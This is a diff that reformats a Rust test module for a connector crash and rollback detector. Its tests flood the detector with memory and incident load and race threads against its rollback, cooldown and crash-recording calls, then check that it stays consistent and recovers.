+                "Memory attack {} completed: {} events in {:?}",
+                scenario_name, event_count, total_duration
+            );
 
             // Verify system remains responsive after flooding
-            assert!(total_duration < Duration::from_secs(30),
-                "Memory attack {}: Total processing should complete in reasonable time", scenario_name);
+            assert!(
+                total_duration < Duration::from_secs(30),
+                "Memory attack {}: Total processing should complete in reasonable time",
+                scenario_name
+            );
 
             // Test system functionality after memory pressure
             let test_event = CrashEvent {
@@ -3401,12 +3836,13 @@ mod tests {
             // Should remain functional after memory attack
             // (record_crash returns (), so just verify it doesn't panic)
 
-            let post_flood_count = detector.crashes_in_window_for(
-                &format!("post_flood_test_{}", scenario_name),
-                20000,
+            let post_flood_count = detector
+                .crashes_in_window_for(&format!("post_flood_test_{}", scenario_name), 20000);
+            assert_eq!(
+                post_flood_count, 1,
+                "Memory attack {}: System should remain functional after flooding",
+                scenario_name
             );
-            assert_eq!(post_flood_count, 1,
-                "Memory attack {}: System should remain functional after flooding", scenario_name);
         }
 
         // Test memory pressure via incident accumulation
@@ -3433,10 +3869,14 @@ mod tests {
         let incident_count_after = detector.incidents.len();
         let incidents_added = incident_count_after - incident_count_before;
 
-        assert!(incidents_added > 0,
-            "Incident flooding should create incidents");
-        assert!(incidents_added <= 100,
-            "Incident count should be reasonable");
+        assert!(
+            incidents_added > 0,
+            "Incident flooding should create incidents"
+        );
+        assert!(
+            incidents_added <= 100,
+            "Incident count should be reasonable"
+        );
 
         // Verify detector remains functional after incident flooding
         let final_test_event = CrashEvent {
@@ -3448,11 +3888,15 @@ mod tests {
         detector.record_crash(final_test_event, 40000, "final_memory_test".to_string());
 
         let final_count = detector.crashes_in_window_for("final_memory_test", 40000);
-        assert_eq!(final_count, 1,
-            "Detector should remain fully functional after all memory attacks");
+        assert_eq!(
+            final_count, 1,
+            "Detector should remain fully functional after all memory attacks"
+        );
 
-        println!("Memory exhaustion attack test completed: {} scenarios + incident flooding tested",
-            memory_attack_scenarios.len());
+        println!(
+            "Memory exhaustion attack test completed: {} scenarios + incident flooding tested",
+            memory_attack_scenarios.len()
+        );
     }
 
     #[test]
@@ -3488,14 +3932,15 @@ mod tests {
         // Concurrent race attack patterns
         let race_scenarios = [
             // Simultaneous rollback evaluation race
-            ("simultaneous_rollback", 20, "Simultaneous rollback evaluation"),
-
+            (
+                "simultaneous_rollback",
+                20,
+                "Simultaneous rollback evaluation",
+            ),
             // Cooldown bypass race
             ("cooldown_race", 15, "Cooldown state race condition"),
-
             // Incident recording race
             ("incident_race", 25, "Incident recording race condition"),
-
             // Mixed operation race
             ("mixed_ops_race", 30, "Mixed operations race condition"),
         ];
@@ -3520,23 +3965,32 @@ mod tests {
                             for attempt in 0..10 {
                                 let pin = KnownGoodPin {
                                     connector_id: race_connector.to_string(),
-                                    version: format!("race_{}_{}_{}", race_name_clone, thread_id, attempt),
+                                    version: format!(
+                                        "race_{}_{}_{}",
+                                        race_name_clone, thread_id, attempt
+                                    ),
                                     pin_hash: format!("race_hash_{}_{}", thread_id, attempt),
                                     trusted: true,
                                 };
 
                                 let rollback_result = {
                                     match detector_clone.lock() {
-                                        Ok(mut det) => {
-                                            det.evaluate_rollback(
-                                                race_connector,
-                                                &pin,
-                                                60000 + (thread_id * 100) as u64 + attempt,
-                                                format!("race_rollback_{}_{}_{}", race_name_clone, thread_id, attempt),
-                                            )
-                                        },
+                                        Ok(mut det) => det.evaluate_rollback(
+                                            race_connector,
+                                            &pin,
+                                            60000 + (thread_id * 100) as u64 + attempt,
+                                            format!(
+                                                "race_rollback_{}_{}_{}",
+                                                race_name_clone, thread_id, attempt
+                                            ),
+                                        ),
                                         Err(_) => {
-                                            thread_results.push((thread_id, attempt, "lock_poison".to_string(), false));
+                                            thread_results.push((
+                                                thread_id,
+                                                attempt,
+                                                "lock_poison".to_string(),
+                                                false,
+                                            ));
                                             continue;
                                         }
                                     }
@@ -3547,26 +4001,43 @@ mod tests {
                                     Err(_) => (false, false),
                                 };
 
-                                thread_results.push((thread_id, attempt, "rollback".to_string(), success));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "rollback".to_string(),
+                                    success,
+                                ));
 
                                 // Brief yield to encourage race conditions
                                 thread::yield_now();
                             }
-                        },
+                        }
                         "cooldown_race" => {
                             // Race condition in cooldown checking/setting
                             for attempt in 0..15 {
                                 let cooldown_check = {
                                     match detector_clone.lock() {
-                                        Ok(det) => det.in_cooldown_for(race_connector, 61000 + attempt),
+                                        Ok(det) => {
+                                            det.in_cooldown_for(race_connector, 61000 + attempt)
+                                        }
                                         Err(_) => {
-                                            thread_results.push((thread_id, attempt, "cooldown_lock_poison".to_string(), false));
+                                            thread_results.push((
+                                                thread_id,
+                                                attempt,
+                                                "cooldown_lock_poison".to_string(),
+                                                false,
+                                            ));
                                             continue;
                                         }
                                     }
                                 };
 
-                                thread_results.push((thread_id, attempt, "cooldown_check".to_string(), cooldown_check));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "cooldown_check".to_string(),
+                                    cooldown_check,
+                                ));
 
                                 // Attempt rapid rollback evaluation during cooldown checks
                                 let pin = KnownGoodPin {
@@ -3578,27 +4049,38 @@ mod tests {
 
                                 let eval_during_check = {
                                     match detector_clone.lock() {
-                                        Ok(mut det) => {
-                                            det.evaluate_rollback(
-                                                race_connector,
-                                                &pin,
-                                                61000 + attempt,
-                                                format!("cooldown_race_{}_{}_{}", race_name_clone, thread_id, attempt),
-                                            )
-                                        },
+                                        Ok(mut det) => det.evaluate_rollback(
+                                            race_connector,
+                                            &pin,
+                                            61000 + attempt,
+                                            format!(
+                                                "cooldown_race_{}_{}_{}",
+                                                race_name_clone, thread_id, attempt
+                                            ),
+                                        ),
                                         Err(_) => {
-                                            thread_results.push((thread_id, attempt, "eval_lock_poison".to_string(), false));
+                                            thread_results.push((
+                                                thread_id,
+                                                attempt,
+                                                "eval_lock_poison".to_string(),
+                                                false,
+                                            ));
                                             continue;
                                         }
                                     }
                                 };
 
                                 let eval_success = eval_during_check.is_ok();
-                                thread_results.push((thread_id, attempt, "eval_during_cooldown".to_string(), eval_success));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "eval_during_cooldown".to_string(),
+                                    eval_success,
+                                ));
 
                                 thread::yield_now();
                             }
-                        },
+                        }
                         "incident_race" => {
                             // Race condition in incident recording
                             for attempt in 0..20 {
@@ -3615,15 +4097,23 @@ mod tests {
                                             det.record_crash(
                                                 crash_event,
                                                 62000 + (thread_id * 100) as u64 + attempt,
-                                                format!("incident_race_{}_{}_{}", race_name_clone, thread_id, attempt),
+                                                format!(
+                                                    "incident_race_{}_{}_{}",
+                                                    race_name_clone, thread_id, attempt
+                                                ),
                                             );
                                             true
-                                        },
+                                        }
                                         Err(_) => false,
                                     }
                                 };
 
-                                thread_results.push((thread_id, attempt, "crash_record".to_string(), record_result));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "crash_record".to_string(),
+                                    record_result,
+                                ));
 
                                 // Immediate evaluation after recording
                                 let pin = KnownGoodPin {
@@ -3635,93 +4125,134 @@ mod tests {
 
                                 let immediate_eval = {
                                     match detector_clone.lock() {
-                                        Ok(mut det) => {
-                                            det.evaluate_rollback(
+                                        Ok(mut det) => det
+                                            .evaluate_rollback(
                                                 race_connector,
                                                 &pin,
                                                 62000 + (thread_id * 100) as u64 + attempt + 1,
-                                                format!("incident_eval_{}_{}_{}", race_name_clone, thread_id, attempt),
-                                            ).is_ok()
-                                        },
+                                                format!(
+                                                    "incident_eval_{}_{}_{}",
+                                                    race_name_clone, thread_id, attempt
+                                                ),
+                                            )
+                                            .is_ok(),
                                         Err(_) => false,
                                     }
                                 };
 
-                                thread_results.push((thread_id, attempt, "immediate_eval".to_string(), immediate_eval));
+                                thread_results.push((
+                                    thread_id,
+                                    attempt,
+                                    "immediate_eval".to_string(),
+                                    immediate_eval,
+                                ));
                                 thread::yield_now();
                             }
-                        },
+                        }
                         "mixed_ops_race" => {
                             // Mixed operations to maximize race condition potential
                             for attempt in 0..10 {
                                 let operations = [
-                                    "crash_record", "rollback_eval", "cooldown_check", "crash_count"
+                                    "crash_record",
+                                    "rollback_eval",
+                                    "cooldown_check",
+                                    "crash_count",
                                 ];
 
                                 for (op_idx, operation) in operations.iter().enumerate() {
                                     let op_result = match *operation {
-                                        "crash_record" => {
-                                            match detector_clone.lock() {
-                                                Ok(mut det) => {
-                                                    det.record_crash(
-                                                        CrashEvent {
-                                                            connector_id: race_connector.to_string(),
-                                                            timestamp: format!("mixed_{}_{}_{}", thread_id, attempt, op_idx),
-                                                            reason: format!("mixed_crash_{}_{}", thread_id, op_idx),
-                                                        },
-                                                        63000 + (thread_id * 1000) as u64 + (attempt * 10) as u64 + op_idx as u64,
-                                                        format!("mixed_record_{}_{}_{}", thread_id, attempt, op_idx),
-                                                    );
-                                                    true
-                                                },
-                                                Err(_) => false,
+                                        "crash_record" => match detector_clone.lock() {
+                                            Ok(mut det) => {
+                                                det.record_crash(
+                                                    CrashEvent {
+                                                        connector_id: race_connector.to_string(),
+                                                        timestamp: format!(
+                                                            "mixed_{}_{}_{}",
+                                                            thread_id, attempt, op_idx
+                                                        ),
+                                                        reason: format!(
+                                                            "mixed_crash_{}_{}",
+                                                            thread_id, op_idx
+                                                        ),
+                                                    },
+                                                    63000
+                                                        + (thread_id * 1000) as u64
+                                                        + (attempt * 10) as u64
+                                                        + op_idx as u64,
+                                                    format!(
+                                                        "mixed_record_{}_{}_{}",
+                                                        thread_id, attempt, op_idx
+                                                    ),
+                                                );
+                                                true
                                             }
+                                            Err(_) => false,
                                         },
                                         "rollback_eval" => {
                                             let pin = KnownGoodPin {
                                                 connector_id: race_connector.to_string(),
                                                 version: "mixed_race".to_string(),
-                                                pin_hash: format!("mixed_hash_{}_{}", thread_id, attempt),
+                                                pin_hash: format!(
+                                                    "mixed_hash_{}_{}",
+                                                    thread_id, attempt
+                                                ),
                                                 trusted: true,
                                             };
 
                                             match detector_clone.lock() {
-                                                Ok(mut det) => {
-                                                    det.evaluate_rollback(
+                                                Ok(mut det) => det
+                                                    .evaluate_rollback(
                                                         race_connector,
                                                         &pin,
-                                                        63000 + (thread_id * 1000) as u64 + (attempt * 10) as u64 + op_idx as u64,
-                                                        format!("mixed_eval_{}_{}_{}", thread_id, attempt, op_idx),
-                                                    ).is_ok()
-                                                },
+                                                        63000
+                                                            + (thread_id * 1000) as u64
+                                                            + (attempt * 10) as u64
+                                                            + op_idx as u64,
+                                                        format!(
+                                                            "mixed_eval_{}_{}_{}",
+                                                            thread_id, attempt, op_idx
+                                                        ),
+                                                    )
+                                                    .is_ok(),
                                                 Err(_) => false,
                                             }
+                                        }
+                                        "cooldown_check" => match detector_clone.lock() {
+                                            Ok(det) => det.in_cooldown_for(
+                                                race_connector,
+                                                63000
+                                                    + (thread_id * 1000) as u64
+                                                    + (attempt * 10) as u64
+                                                    + op_idx as u64,
+                                            ),
+                                            Err(_) => false,
                                         },
-                                        "cooldown_check" => {
-                                            match detector_clone.lock() {
-                                                Ok(det) => {
-                                                    det.in_cooldown_for(race_connector, 63000 + (thread_id * 1000) as u64 + (attempt * 10) as u64 + op_idx as u64)
-                                                },
-                                                Err(_) => false,
+                                        "crash_count" => match detector_clone.lock() {
+                                            Ok(det) => {
+                                                let count = det.crashes_in_window_for(
+                                                    race_connector,
+                                                    63000
+                                                        + (thread_id * 1000) as u64
+                                                        + (attempt * 10) as u64
+                                                        + op_idx as u64,
+                                                );
+                                                count > 0
                                             }
-                                        },
-                                        "crash_count" => {
-                                            match detector_clone.lock() {
-                                                Ok(det) => {
-                                                    let count = det.crashes_in_window_for(race_connector, 63000 + (thread_id * 1000) as u64 + (attempt * 10) as u64 + op_idx as u64);
-                                                    count > 0
-                                                },
-                                                Err(_) => false,
-                                            }
+                                            Err(_) => false,
                                         },
                                         _ => false,
                                     };
 
-                                    thread_results.push((thread_id, attempt, operation.to_string(), op_result));
+                                    thread_results.push((
+                                        thread_id,
+                                        attempt,
+                                        operation.to_string(),
+                                        op_result,
+                                    ));
                                     thread::yield_now();
                                 }
                             }
-                        },
+                        }
                         _ => unreachable!(),
                     }
 
@@ -3739,12 +4270,16 @@ mod tests {
 
             // Analyze race condition results
             let results = race_results.lock().unwrap();
-            let scenario_results: Vec<_> = results.iter()
+            let scenario_results: Vec<_> = results
+                .iter()
                 .filter(|(_, _, op, _)| op.contains(race_name))
                 .collect();
 
-            println!("Race scenario {} completed: {} operations recorded",
-                race_name, scenario_results.len());
+            println!(
+                "Race scenario {} completed: {} operations recorded",
+                race_name,
+                scenario_results.len()
+            );
 
             // Verify system consistency after race conditions
             let final_state = {
@@ -3759,13 +4294,23 @@ mod tests {
             let (final_crash_count, final_cooldown_status, final_incident_count) = final_state;
 
             // System should remain in consistent state despite race conditions
-            assert!(final_crash_count <= 1000,
-                "Race {}: Final crash count should be reasonable: {}", race_name, final_crash_count);
-            assert!(final_incident_count <= 10000,
-                "Race {}: Final incident count should be reasonable: {}", race_name, final_incident_count);
+            assert!(
+                final_crash_count <= 1000,
+                "Race {}: Final crash count should be reasonable: {}",
+                race_name,
+                final_crash_count
+            );
+            assert!(
+                final_incident_count <= 10000,
+                "Race {}: Final incident count should be reasonable: {}",
+                race_name,
+                final_incident_count
+            );
 
-            println!("Race scenario {} analysis: crashes={}, cooldown={}, incidents={}",
-                race_name, final_crash_count, final_cooldown_status, final_incident_count);
+            println!(
+                "Race scenario {} analysis: crashes={}, cooldown={}, incidents={}",
+                race_name, final_crash_count, final_cooldown_status, final_incident_count
+            );
         }
 
         // Test system recovery after all race conditions
@@ -3785,10 +4330,18 @@ mod tests {
             det.crashes_in_window_for("post_race_recovery", 80000)
         };
 
-        assert_eq!(recovery_count, 1,
-            "System should fully recover after all race condition attacks");
+        assert_eq!(
+            recovery_count, 1,
+            "System should fully recover after all race condition attacks"
+        );
 
-        println!("Concurrent race exploitation test completed: {} race scenarios tested with {} total threads",
-            race_scenarios.len(), race_scenarios.iter().map(|(_, count, _)| count).sum::<usize>());
+        println!(
+            "Concurrent race exploitation test completed: {} race scenarios tested with {} total threads",
+            race_scenarios.len(),
+            race_scenarios
+                .iter()
+                .map(|(_, count, _)| count)
+                .sum::<usize>()
+        );
     }
 }
